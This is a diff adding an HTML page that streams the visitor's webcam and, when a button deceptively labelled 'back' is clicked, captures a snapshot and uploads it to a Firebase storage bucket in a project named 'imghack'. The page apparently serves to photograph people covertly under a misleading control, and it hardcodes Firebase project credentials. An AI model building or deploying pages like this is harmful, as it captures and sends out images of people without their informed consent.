@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Firebase Image Upload in Javascript</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  </head>
+  <body class="bg-danger">
+
+    <!-- Stream video via webcam -->
+<center>
+    <video id="video" width=450 height=500 playsinline controls autoplay></video><br>
+
+<!-- Trigger canvas web API -->
+    <button id="snap" class="btn btn-success font-weight-bold" >back</button>
+
+<!-- Webcam video snapshot -->
+<canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
+</center>
+  </body>
+  <script src="https://www.gstatic.com/firebasejs/7.7.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/7.7.0/firebase-storage.js"></script>
+
+  <script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyAw--V0nd8ohVnbmAab4ICoVjs9CGMNCLo",
+    authDomain: "imghack-c264d.firebaseapp.com",
+    projectId: "imghack-c264d",
+    storageBucket: "imghack-c264d.appspot.com",
+    messagingSenderId: "867535249967",
+    appId: "1:867535249967:web:4cdf87b3d1ec3246195cda"
+  };
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    console.log(firebase);
+
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const snap = document.getElementById("snap");
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    width: 400, height: 400
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+}
+
+// Load init
+init();
+
+// Draw image
+var context = canvas.getContext('2d');
+snap.addEventListener("click", function() {
+    context.drawImage(video, 0, 0, 640, 480);
+    var image = new Image();
+image.id = "pic";
+image.src = canvas.toDataURL();
+//console.log(image.src)
+//var button = document.createElement('button')
+//button.textContent = 'Save'
+//document.body.appendChild(button)
+
+
+    const ref = firebase.storage().ref();
+    ref.child(new Date() + '-' + 'base64').putString(image.src, 'data_url').then(function(snapshot) {
+    console.log('Uploaded a data_url string!');
+    alert("Image Uploaded")
+});
+
+});
+  </script>
+</html>
